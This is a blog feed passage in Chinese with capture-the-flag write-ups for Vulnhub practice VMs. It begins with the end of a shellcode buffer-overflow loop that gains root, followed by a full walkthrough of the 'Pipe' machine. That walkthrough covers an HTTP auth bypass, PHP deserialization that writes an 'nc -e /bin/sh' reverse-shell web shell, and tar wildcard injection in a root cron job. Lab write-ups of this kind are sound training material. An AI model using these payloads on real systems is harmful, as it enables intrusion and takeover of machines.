<span class="n">payload</span><span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x31</span>\<span class="n">xc0</span>\<span class="n">x50</span>\<span class="n">x68</span>\<span class="n">x2f</span>\<span class="n">x2f</span>\<span class="n">x73</span>\<span class="n">x68</span>\<span class="n">x68</span>\<span class="n">x2f</span>\<span class="n">x62</span>\<span class="n">x69</span>\<span class="n">x6e</span>\<span class="n">x89</span>\<span class="n">xe3</span>\<span class="n">x89</span>\<span class="n">xc1</span>\<span class="n">x89</span>\<span class="n">xc2</span>\<span class="n">xb0</span>\<span class="n">x0b</span>\<span class="n">xcd</span>\<span class="n">x80</span>\<span class="n">x31</span>\<span class="n">xc0</span>\<span class="n">x40</span>\<span class="n">xcd</span>\<span class="n">x80</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>        <span class="c">#shellcode&lt;/p&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">):</span>
                <span class="n">cmd</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">/</span><span class="n">SECRET</span><span class="o">/</span><span class="n">door</span><span class="o">%</span><span class="n">d</span><span class="o">/</span><span class="nb">file</span> <span class="o">%</span><span class="n">s</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
                <span class="n">os</span><span class="o">.</span><span class="n">system</span> <span class="p">(</span><span class="n">cmd</span><span class="p">)</span></code></pre></div></p>

<p>拿了一份會執行/bin/sh的
<a href="http://shell-storm.org/shellcode/files/shellcode-811.php">shellcode</a>，把payload拼完之後就是賭人品的時刻了</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>&lt;/p&gt;

&lt;h1&gt;id&lt;/h1&gt;

&lt;p&gt;uid<span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1000<span class="o">(</span>smeagol<span class="o">)</span></code></pre></div></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[/dev/random: Pipe]]></title>
    <link href="http://newdominic.github.io/blog/2015/12/23/pipe/"/>
    <updated>2015-12-23T00:38:42+08:00</updated>
    <id>http://newdominic.github.io/blog/2015/12/23/pipe</id>
    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/devrandom-pipe,124/">/dev/random: Pipe</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>

<!--more-->


<hr />

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/pipe# nmap 192.168.0.118 -p- -T5 -n&lt;/p&gt;

&lt;p&gt;Starting Nmap 6.49BETA4 <span class="o">(</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://nmap.org&quot;</span>&gt;https://nmap.org&lt;/a&gt; <span class="o">)</span> at 2015-12-21 04:55 CST
Warning: 192.168.0.118 giving up on port because retransmission cap hit <span class="o">(</span>2<span class="o">)</span>.
Nmap scan report <span class="k">for</span> 192.168.0.118
Host is up <span class="o">(</span>0.00019s latency<span class="o">)</span>.
Not shown: <span class="m">65531</span> closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
35856/tcp open  unknown
MAC Address: 08:00:27:D7:0B:8C <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>&lt;/p&gt;

&lt;p&gt;Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 513.72 seconds</code></pre></div></p>

<p>nmap掃出了四個開啟的port，先來看一下port 80</p>

<p><img class="center" src="/images/2015-12-23-pipe/web.png"></p>

<p>&hellip;&hellip;第一次遇到首頁就要輸入帳號密碼的</p>

<p>35856不知道做甚麼用的，再深入掃瞄試試</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/pipe# nmap 192.168.0.118 -p 22,80,111,35856 -A -O
<span class="p">&amp;</span>hellip<span class="p">;</span>
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian <span class="m">5</span> <span class="o">(</span>protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey:
<span class="p">|</span>   <span class="m">1024</span> 16:48:50:89:e7:c9:1f:90:ff:15:d8:3e:ce:ea:53:8f <span class="o">(</span>DSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">2048</span> ca:f9:85:be:d7:36:47:51:4f:e6:27:84:72:eb:e8:18 <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>&lt;em&gt;  <span class="m">256</span> d8:47:a0:87:84:b2:eb:f5:be:fc:1c:f1:c9:7f:e3:52 <span class="o">(</span>ECDSA<span class="o">)</span>
80/tcp    open  http    Apache httpd
<span class="p">|</span> http-auth:
<span class="p">|</span> HTTP/1.1 <span class="m">401</span> Unauthorized
<span class="p">|</span>&lt;/em&gt;  Basic <span class="nv">realm</span><span class="o">=</span>index.php
<span class="p">|</span>&lt;em&gt;http-methods: No Allow or Public header in OPTIONS response <span class="o">(</span>status code 401<span class="o">)</span>
<span class="p">|</span>&lt;/em&gt;http-server-header: Apache
<span class="p">|</span>&lt;em&gt;http-title: <span class="m">401</span> Unauthorized
111/tcp   open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
<span class="p">|</span> rpcinfo:
<span class="p">|</span>   program version   port/proto  service
<span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
<span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
<span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          35856/tcp  status
<span class="p">|</span>&lt;/em&gt;  <span class="m">100024</span>  <span class="m">1</span>          44438/udp  status
35856/tcp open  status  <span class="m">1</span> <span class="o">(</span>RPC <span class="c">#100024)</span></code></pre></div></p>

<p>結果是rpc對應的port。</p>

<p>在不知道能做甚麼的情況下，只好回到網頁的部分亂試一通</p>

<p>最後試到只要在request method的部分不要用GET就能繞過認證了</p>

<p><img class="center" src="/images/2015-12-23-pipe/index.png"></p>

<p>接著檢視一下程式碼</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;/p&gt;

&lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;scriptz/php.js&quot;</span>&gt;&lt;/script&gt;


&lt;p&gt;&lt;script&gt;
<span class="k">function</span> submit_form<span class="o">()</span> <span class="o">{</span>
var <span class="nv">object</span> <span class="o">=</span> serialize<span class="o">({</span>id: 1, firstname: <span class="p">&amp;</span>lsquo<span class="p">;</span>Rene<span class="p">&amp;</span>rsquo<span class="p">;</span>, surname: <span class="p">&amp;</span>lsquo<span class="p">;</span>Margitte<span class="p">&amp;</span>rsquo<span class="p">;</span>, artwork: <span class="p">&amp;</span>lsquo<span class="p">;</span>The Treachery of Images<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">})</span><span class="p">;</span>
<span class="nv">object</span> <span class="o">=</span> object.substr<span class="o">(</span>object.indexOf<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span><span class="o">{</span><span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>,object.length<span class="o">)</span><span class="p">;</span>
<span class="nv">object</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>O:4:<span class="se">\&quot;</span>Info<span class="se">\&amp;</span>rdquo<span class="p">;</span>:4:<span class="p">&amp;</span>ldquo<span class="p">;</span> + object<span class="p">;</span>
document.forms<span class="o">[</span>0<span class="o">]</span>.param.value <span class="o">=</span> object<span class="p">;</span>
document.getElementById<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>info_form<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span>.submit<span class="o">()</span><span class="p">;</span>
<span class="o">}</span>
<span class="p">&amp;</span>hellip<span class="p">;</span>
&lt;form <span class="nv">action</span><span class="o">=</span><span class="s2">&quot;index.php&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;info_form&quot;</span> <span class="nv">method</span><span class="o">=</span><span class="s2">&quot;POST&quot;</span>&gt;
   &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;hidden&quot;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;param&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> /&gt;
   &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;#&quot;</span> <span class="nv">onclick</span><span class="o">=</span><span class="s2">&quot;submit_form(); return false;&quot;</span>&gt;Show Artist Info.&lt;/a&gt;
&lt;/form&gt;&lt;/center&gt;&lt;/html&gt;</code></pre></div></p>

<p>scriptz目錄是開放的，從裡面獲得另一個檔案&#8221;log.php.BAK&#8221;</p>

<p>這個class會在destruct的時候將data的內容寫入filename</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="p">&amp;</span>lt<span class="p">;</span>?php
class Log
<span class="o">{</span>
    public <span class="nv">$filename</span> <span class="o">=</span> <span class="p">&amp;</span>lsquo<span class="p">;&amp;</span>rsquo<span class="p">;;</span>
    public <span class="nv">$data</span> <span class="o">=</span> <span class="p">&amp;</span>lsquo<span class="p">;&amp;</span>rsquo<span class="p">;;</span>&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;public <span class="k">function</span> __construct<span class="o">()</span>
<span class="o">{</span>
    <span class="nv">$this</span>-<span class="p">&amp;</span>gt<span class="p">;</span><span class="nv">filename</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="nv">$this</span>-<span class="p">&amp;</span>gt<span class="p">;</span><span class="nv">data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="o">}</span>

public <span class="k">function</span> PrintLog<span class="o">()</span>
<span class="o">{</span>
    <span class="nv">$pre</span> <span class="o">=</span> <span class="s2">&quot;[LOG]&quot;</span><span class="p">;</span>
    <span class="nv">$now</span> <span class="o">=</span> date<span class="o">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="o">)</span><span class="p">;</span>

    <span class="nv">$str</span> <span class="o">=</span> <span class="s1">&#39;$pre - $now - $this-&amp;gt;data&#39;</span><span class="p">;</span>
    <span class="nb">eval</span><span class="o">(</span><span class="s2">&quot;\$str = \&quot;$str\&quot;;&quot;</span><span class="o">)</span><span class="p">;</span>
    <span class="nb">echo</span> <span class="nv">$str</span><span class="p">;</span>
<span class="o">}</span>

public <span class="k">function</span> __destruct<span class="o">()</span>
<span class="o">{</span>
    file_put_contents<span class="o">(</span><span class="nv">$this</span>-<span class="p">&amp;</span>gt<span class="p">;</span>filename, <span class="nv">$this</span>-<span class="p">&amp;</span>gt<span class="p">;</span>data, FILE_APPEND<span class="o">)</span><span class="p">;</span>
<span class="o">}</span>
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;<span class="o">}</span>
?&gt;</code></pre></div></p>

<p>按下頁面下方的Show Artist Info之後，瀏覽器會POST一些經過serialize處理後的資訊到index.php</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">param</span><span class="o">=</span>O:4:<span class="p">&amp;</span>ldquo<span class="p">;</span>Info<span class="p">&amp;</span>rdquo<span class="p">;</span>:4:<span class="o">{</span>s:2:<span class="p">&amp;</span>ldquo<span class="p">;</span>id<span class="p">&amp;</span>rdquo<span class="p">;;</span>i:1<span class="p">;</span>s:9:<span class="p">&amp;</span>ldquo<span class="p">;</span>firstname<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:4:<span class="p">&amp;</span>ldquo<span class="p">;</span>Rene<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:7:<span class="p">&amp;</span>ldquo<span class="p">;</span>surname<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:8:<span class="p">&amp;</span>ldquo<span class="p">;</span>Margitte<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:7:<span class="p">&amp;</span>ldquo<span class="p">;</span>artwork<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:23:<span class="p">&amp;</span>ldquo<span class="p">;</span>The+Treachery+of+Images<span class="p">&amp;</span>rdquo<span class="p">;;</span><span class="o">}</span>&lt;/p&gt;

&lt;p&gt;</code></pre></div></p>

<p>serialize的做法在php.js</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">//   example 1: serialize<span class="o">([</span><span class="p">&amp;</span>lsquo<span class="p">;</span>Kevin<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>van<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>Zonneveld<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">])</span><span class="p">;</span>
//   returns 1: <span class="p">&amp;</span>lsquo<span class="p">;</span>a:3:<span class="o">{</span>i:0<span class="p">;</span>s:5:<span class="p">&amp;</span>ldquo<span class="p">;</span>Kevin<span class="p">&amp;</span>rdquo<span class="p">;;</span>i:1<span class="p">;</span>s:3:<span class="p">&amp;</span>ldquo<span class="p">;</span>van<span class="p">&amp;</span>rdquo<span class="p">;;</span>i:2<span class="p">;</span>s:9:<span class="p">&amp;</span>ldquo<span class="p">;</span>Zonneveld<span class="p">&amp;</span>rdquo<span class="p">;;</span><span class="o">}</span><span class="p">&amp;</span>rsquo<span class="p">;</span>
//   example 2: serialize<span class="o">({</span>firstName: <span class="p">&amp;</span>lsquo<span class="p">;</span>Kevin<span class="p">&amp;</span>rsquo<span class="p">;</span>, midName: <span class="p">&amp;</span>lsquo<span class="p">;</span>van<span class="p">&amp;</span>rsquo<span class="p">;</span>, surName: <span class="p">&amp;</span>lsquo<span class="p">;</span>Zonneveld<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">})</span><span class="p">;</span>
//   returns 2: <span class="p">&amp;</span>lsquo<span class="p">;</span>a:3:<span class="o">{</span>s:9:<span class="p">&amp;</span>ldquo<span class="p">;</span>firstName<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:5:<span class="p">&amp;</span>ldquo<span class="p">;</span>Kevin<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:7:<span class="p">&amp;</span>ldquo<span class="p">;</span>midName<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:3:<span class="p">&amp;</span>ldquo<span class="p">;</span>van<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:7:<span class="p">&amp;</span>ldquo<span class="p">;</span>surName<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:9:<span class="p">&amp;</span>ldquo<span class="p">;</span>Zonneveld<span class="p">&amp;</span>rdquo<span class="p">;;</span><span class="o">}</span><span class="p">&amp;</span>rsquo<span class="p">;</span></code></pre></div></p>

<p>接著將submit_form()的內容改成要送出的資訊</p>

<p><img class="center" src="/images/2015-12-23-pipe/html.png"></p>

<p>選擇送到scriptz是因為可以直接進到scriptz的目錄確認有沒有寫入成功</p>

<p><img class="center" src="/images/2015-12-23-pipe/yo.png"></p>

<p>而data的內容看起來也是成功寫入yo.php了</p>

<p><img class="center" src="/images/2015-12-23-pipe/yo2.png"></p>

<p>再來就試試看能不能送個reverse shell回來</p>

<p>直接修改html的內容</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;script&gt;
<span class="k">function</span> submit_form<span class="o">()</span> <span class="o">{</span>
  var <span class="nv">object</span> <span class="o">=</span> serialize<span class="o">({</span>filename: <span class="p">&amp;</span>lsquo<span class="p">;</span>/var/www/html/scriptz/shell.php<span class="p">&amp;</span>rsquo<span class="p">;</span>, data: <span class="p">&amp;</span>lsquo<span class="p">;&amp;</span>lt<span class="p">;</span>?php passthru<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>nc -e /bin/sh 192.168.0.115 22234<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">;</span> ?&gt;<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">})</span><span class="p">;</span>
<span class="nv">object</span> <span class="o">=</span> object.substr<span class="o">(</span>object.indexOf<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span><span class="o">{</span><span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>,object.length<span class="o">)</span><span class="p">;</span>
  <span class="nv">object</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>O:3:<span class="se">\&quot;</span>Log<span class="se">\&amp;</span>rdquo<span class="p">;</span>:2:<span class="p">&amp;</span>ldquo<span class="p">;</span> + object<span class="p">;</span>
document.forms<span class="o">[</span>0<span class="o">]</span>.param.value <span class="o">=</span> object<span class="p">;</span>
document.getElementById<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>info_form<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span>.submit<span class="o">()</span><span class="p">;</span>
<span class="o">}</span>
&lt;/script&gt;</code></pre></div></p>

<p>連上 <a href="http://192.168.0.117/scriptz/shell.php">http://192.168.0.117/scriptz/shell.php</a> 之後瀏覽器就卡住了</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/pipe# nc -lp 22234
id
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
uname -a
Linux pipe 3.16.0-4-amd64 <span class="c">#1 SMP Debian 3.16.7-ckt11-1 (2015-05-24) x86_64 GNU/Linux</span></code></pre></div></p>

<p>shell GET!</p>

<p>簡單地蒐集資訊之後，找到一個使用者 rene ，而且他的家目錄沒有擋權限</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">ls -al
total 208
drwxrwxrwx <span class="m">2</span> rene rene   <span class="m">4096</span> Dec <span class="m">23</span> 05:04 .
drwxr-xr-x <span class="m">3</span> rene rene   <span class="m">4096</span> Jul  <span class="m">6</span> 07:42 ..
-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> rene rene <span class="m">124078</span> Dec <span class="m">23</span> 05:00 backup.tar.gz
-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> rene rene  <span class="m">26558</span> Dec <span class="m">23</span> 05:02 sys-12512.BAK
-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> rene rene  <span class="m">11402</span> Dec <span class="m">23</span> 05:01 sys-23924.BAK
-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> rene rene   <span class="m">7231</span> Dec <span class="m">23</span> 05:04 sys-2448.BAK
-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> rene rene  <span class="m">27182</span> Dec <span class="m">23</span> 05:03 sys-5018.BAK</code></pre></div></p>

<p>backup目錄看起來每隔一分鐘就會生出一個檔案，每五分鐘就會打包一包backup.tar.gz</p>

<p>推測是有在跑cron，剛好/etc/crontab也可以讀取，就來看看cron的設定</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;/p&gt;

&lt;h1&gt;/etc/crontab: system-wide crontab&lt;/h1&gt;

&lt;h1&gt;Unlike any other crontab you don<span class="p">&amp;</span>rsquo<span class="p">;</span>t have to run the <span class="sb">`</span>crontab<span class="err">&#39;</span>&lt;/h1&gt;

&lt;h1&gt;command to install the new version when you edit this file&lt;/h1&gt;

&lt;h1&gt;and files in /etc/cron.d. These files also have username fields,&lt;/h1&gt;

&lt;h1&gt;that none of the other crontabs <span class="k">do</span>.&lt;/h1&gt;

&lt;p&gt;SHELL<span class="o">=</span>/bin/sh
<span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin&lt;/p&gt;

&lt;h1&gt;m h dom mon dow user  <span class="nb">command</span>&lt;/h1&gt;

&lt;p&gt;17 *    * * *   root    <span class="nb">cd</span> / <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> run-parts <span class="p">&amp;</span>ndash<span class="p">;</span>report /etc/cron.hourly
<span class="m">25</span> <span class="m">6</span>    * * *   root    <span class="nb">test</span> -x /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> run-parts <span class="p">&amp;</span>ndash<span class="p">;</span>report /etc/cron.daily <span class="o">)</span>
<span class="m">47</span> <span class="m">6</span>    * * <span class="m">7</span>   root    <span class="nb">test</span> -x /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> run-parts <span class="p">&amp;</span>ndash<span class="p">;</span>report /etc/cron.weekly <span class="o">)</span>
<span class="m">52</span> <span class="m">6</span>    <span class="m">1</span> * *   root    <span class="nb">test</span> -x /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> run-parts <span class="p">&amp;</span>ndash<span class="p">;</span>report /etc/cron.monthly <span class="o">)</span>
<span class="c">#</span>
* * * * * root /root/create_backup.sh
*/5 * * * * root /usr/bin/compress.sh</code></pre></div></p>

<p>只能看到/usr/bin/compress.sh的內容</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">cat compress.sh&lt;/p&gt;

&lt;h1&gt;!/bin/sh&lt;/h1&gt;

&lt;p&gt;rm -f /home/rene/backup/backup.tar.gz
<span class="nb">cd</span> /home/rene/backup
tar cfz /home/rene/backup/backup.tar.gz *
chown rene:rene /home/rene/backup/backup.tar.gz
rm -f /home/rene/backup/*.BAK</code></pre></div></p>

<p>這邊PATH的設定方式沒辦法達到替換指令的效果</p>

<p>看來只能<a href="http://www.net-security.org/article.php?id=2061">靠tar來做command injection</a>了</p>

<p>於是直接給/bin/sh加上了stickybit</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>chmod u+s /bin/sh<span class="p">&amp;</span>rdquo<span class="p">;</span> &gt; shell.sh</code></pre></div></p>

<p>等時間一到就可以拿到root的權限了</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;/p&gt;

&lt;h1&gt;sh&lt;/h1&gt;

&lt;p&gt;sh&lt;/p&gt;

&lt;h1&gt;id&lt;/h1&gt;

&lt;p&gt;id
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>&lt;/p&gt;

&lt;h1&gt;cat /root/flag.txt&lt;/h1&gt;

&lt;p&gt;cat /root/flag.txt
                                                                   .aMMMMMMMMn.  ,aMMMMn.
                                                                 .aMccccccccc&lt;em&gt;YMMn.    &lt;code&gt;Mb
                                                                aMccccccccccccccc*Mn    MP
                                                               .AMMMMn.   MM&lt;/code&gt;&lt;/em&gt;YMMY&lt;em&gt;ccaM&lt;/em&gt;
                                                              dM&lt;em&gt;  &lt;/em&gt;YMMb  YP        <span class="sb">`</span>cMY
                                                              YM.  .dMMP   aMn.     .cMP
                                                               &lt;em&gt;YMMn.     aMMMMMMMMMMMY<span class="s1">&#39;</span>
<span class="s1">                                                                .&amp;lsquo;YMMb.           ccMP</span>
<span class="s1">                                                             .dMcccccc&lt;/em&gt;Mc&amp;hellip;.cMb.cMP&amp;rsquo;</span>
<span class="s1">                                                           .dMMMMb;cccc&lt;em&gt;Mbcccc,IMMMMMMMn.</span>
<span class="s1">                                                          dY&lt;/em&gt;&amp;lsquo;  &amp;rsquo;&lt;em&gt;M;ccccMM..dMMM..MP&lt;/em&gt;cc&lt;em&gt;Mb</span>
<span class="s1">                                                          YM.    ,MbccMMMMMMMMMMMM&lt;/em&gt;cccc;MP</span>
<span class="s1">                                                           &lt;em&gt;Mbn;adMMMMMMMMMMMMMMMIcccc;M&lt;/em&gt;</span>
<span class="s1">                                                          dPcccccIMMMMMMMMMMMMMMMMa;c;MP</span>
<span class="s1">                                                          Yb;cc;dMMMMMMMMMMMP&lt;em&gt;&amp;lsquo;  &lt;/em&gt;YMMP&lt;em&gt;</span>
<span class="s1">                                                           &lt;/em&gt;YMMMPYMMMMMMP*&amp;rsquo;          curchack</span>
<span class="s1">                                                       +####################################+</span>
<span class="s1">                                                       |======                            | |</span>
<span class="s1">                                                       |======                            | |</span>
<span class="s1">                                                       |======                            | |</span>
<span class="s1">                                                       |======                            | |</span>
<span class="s1">                                                       |======                            | |</span>
<span class="s1">                                                       +&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;-+-+</span>
<span class="s1">                                                        ####################################</span>
<span class="s1">                                                             |======                  |</span>
<span class="s1">                                                             |======                  |</span>
<span class="s1">                                                             |=====                   |</span>
<span class="s1">                                                             |====                    |</span>
<span class="s1">                                                             |                        |</span>
<span class="s1">                                                             +                        +&lt;/p&gt;</span>

<span class="s1">&lt;p&gt; .d8888b.                 d8b          d8b               888                                                                    d8b</span>
<span class="s1">d88P  Y88b                Y8P          88P               888                                                                    Y8P</span>
<span class="s1">888    888                             8P                888</span>
<span class="s1">888        .d88b.  .d8888b888   88888b.&amp;ldquo;  .d88b. .d8888b 888888   88888b.  8888b. .d8888b    888  88888888b.  .d88b.    88888b. 88888888b.  .d88b.</span>
<span class="s1">888       d8P  Y8bd88P&amp;rdquo;   888   888 &amp;ldquo;88b d8P  Y8b88K     888      888 &quot;88b    &quot;88b88K        888  888888 &quot;88bd8P  Y8b   888 &quot;88b888888 &quot;88bd8P  Y8b</span>
<span class="s1">888    88888888888888     888   888  888 88888888&quot;Y8888b.888      888  888.d888888&quot;Y8888b.   888  888888  88888888888   888  888888888  88888888888</span>
<span class="s1">Y88b  d88PY8b.    Y88b.   888   888  888 Y8b.         X88Y88b.    888 d88P888  888     X88   Y88b 888888  888Y8b.       888 d88P888888 d88PY8b.   d8b</span>
<span class="s1"> &quot;Y8888P&amp;rdquo;  &amp;ldquo;Y8888  &quot;Y8888P888   888  888  &quot;Y8888  88888P&#39;</span> <span class="s2">&quot;Y888   88888P&amp;rdquo; &amp;ldquo;Y888888 88888P&#39;    &quot;</span>Y88888888  <span class="m">888</span> <span class="s2">&quot;Y8888    88888P&amp;rdquo; 88888888P&quot;</span>  <span class="p">&amp;</span>ldquo<span class="p">;</span>Y8888Y8P
                                                                  <span class="m">888</span>                                                   <span class="m">888</span>        888
                                                                  <span class="m">888</span>                                                   <span class="m">888</span>        888
                                                                  <span class="m">888</span>                                                   <span class="m">888</span>        888
Well Done!
Here<span class="p">&amp;</span>rsquo<span class="p">;</span>s your flag: 0089cd4f9ae79402cdd4e7b8931892b7</code></pre></div></p>
]]></content>
  </entry>
  
</feed>
